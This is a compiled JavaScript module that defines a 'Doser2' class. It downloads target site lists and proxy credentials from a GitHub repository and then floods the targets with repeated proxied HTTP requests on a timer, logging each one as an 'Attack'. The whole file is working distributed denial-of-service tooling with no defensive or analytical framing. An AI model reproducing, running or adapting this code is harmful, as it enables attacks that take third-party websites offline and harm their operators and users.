"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (_) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.Doser2 = void 0;
var axios_https_proxy_fix_1 = __importDefault(require("axios-https-proxy-fix"));
var events_1 = require("events");
var Doser2 = /** @class */ (function () {
    function Doser2(onlyProxy, workersCount) {
        var _this = this;
        this.loadedTargetsAndProxies = null;
        this.tickingIntervalTime = 2000;
        this.attacksPerSite = 5;
        this.requestsPromises = [];
        this.onlyProxy = onlyProxy;
        this.working = false;
        this.sitesPerTickCount = workersCount;
        this.eventSource = new events_1.EventEmitter();
        //Initialize data
        this.updateTargetsAndProxies();
        // Update data repeatedly
        this.targetsAndProxiesInterval = setInterval(function () {
            _this.updateTargetsAndProxies();
        }, 300000);
    }
    Doser2.prototype.updateTargetsAndProxies = function () {
        var _this = this;
        this.getSitesAndProxies()
            .then(function (data) {
            _this.loadedTargetsAndProxies = data;
        })
            .catch(function () { return console.log('Unable to update data'); });
    };
    Doser2.prototype.forceProxy = function (newVal) {
        this.onlyProxy = newVal;
    };
    Doser2.prototype.getSitesAndProxies = function () {
        return __awaiter(this, void 0, void 0, function () {
            var sitesResponse, proxyResponse, sites, proxies, e_1;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        _a.trys.push([0, 3, , 4]);
                        console.log('Loading targets and proxies;');
                        return [4 /*yield*/, axios_https_proxy_fix_1.default.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })];
                    case 1:
                        sitesResponse = _a.sent();
                        return [4 /*yield*/, axios_https_proxy_fix_1.default.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })
                            // https://www.wikipedia.org/
                        ];
                    case 2:
                        proxyResponse = _a.sent();
                        // https://www.wikipedia.org/
                        if (sitesResponse.status === 200 && proxyResponse.status === 200) {
                            sites = sitesResponse.data;
                            proxies = proxyResponse.data;
                            console.log('Targets and proxies were loaded;');
                            return [2 /*return*/, {
                                    sites: sites,
                                    proxies: proxies
                                }];
                        }
                        else {
                            throw new Error('Bad request, cannot get targets and proxies');
                        }
                        return [3 /*break*/, 4];
                    case 3:
                        e_1 = _a.sent();
                        console.log('Error while loading hosts and proxies: ', e_1);
                        return [3 /*break*/, 4];
                    case 4: return [2 /*return*/, null];
                }
            });
        });
    };
    Doser2.prototype.start = function () {
        var _this = this;
        this.working = true;
        this.tickInterval = setInterval(function () {
            _this.tick()
                .then(function () { return console.log('Tick done'); })
                .catch(function (e) { return console.error('Tick with error'); });
        }, this.tickingIntervalTime);
    };
    Doser2.prototype.stop = function () {
        this.working = false;
    };
    Doser2.prototype.tick = function () {
        return __awaiter(this, void 0, void 0, function () {
            var _a, sites, proxies, _loop_1, this_1, i;
            return __generator(this, function (_b) {
                switch (_b.label) {
                    case 0:
                        if (!this.loadedTargetsAndProxies) {
                            return [2 /*return*/];
                        }
                        _a = this.loadedTargetsAndProxies, sites = _a.sites, proxies = _a.proxies;
                        if (!this.working) return [3 /*break*/, 2];
                        _loop_1 = function (i) {
                            var randomSite = sites[Math.floor(Math.random() * sites.length)]; //Get random site
                            var _loop_2 = function (j) {
                                // Use random proxy for each request
                                var randomProxy = proxies[Math.floor(Math.random() * proxies.length)]; //Get random proxy
                                var proxyAddressSplit = randomProxy.ip.split(':');
                                var proxyIP = proxyAddressSplit[0];
                                var proxyPort = parseInt(proxyAddressSplit[1]);
                                var proxyAuthSplit = randomProxy.auth.split(':');
                                var proxyUsername = proxyAuthSplit[0];
                                var proxyPassword = proxyAuthSplit[1];
                                var promise = axios_https_proxy_fix_1.default.get(randomSite.page, {
                                    timeout: 5000,
                                    validateStatus: function () { return true; },
                                    proxy: {
                                        host: proxyIP,
                                        port: proxyPort,
                                        auth: {
                                            username: proxyUsername,
                                            password: proxyPassword
                                        }
                                    }
                                });
                                // Show some stats about it
                                promise
                                    .then(function (result) {
                                    console.log("Attack: ".concat(randomSite.page, " | ").concat(result.status));
                                    if (result.status === 407) {
                                        console.log('Proxy requires auth: ', randomProxy);
                                    }
                                }).catch(function (e) {
                                    console.log("Fail: ".concat(randomSite.page, " | ").concat(e.code));
                                });
                                this_1.requestsPromises.push(promise);
                            };
                            // Send few requests to the current target
                            for (var j = 0; j < this_1.attacksPerSite; j++) {
                                _loop_2(j);
                            }
                        };
                        this_1 = this;
                        for (i = 0; i < this.sitesPerTickCount; i++) {
                            _loop_1(i);
                        }
                        // Execute all requests
                        return [4 /*yield*/, Promise.all(this.requestsPromises)];
                    case 1:
                        // Execute all requests
                        _b.sent();
                        console.log('Request count: ', this.requestsPromises.length);
                        this.requestsPromises = []; // Clear
                        _b.label = 2;
                    case 2: return [2 /*return*/];
                }
            });
        });
    };
    return Doser2;
}());
exports.Doser2 = Doser2;
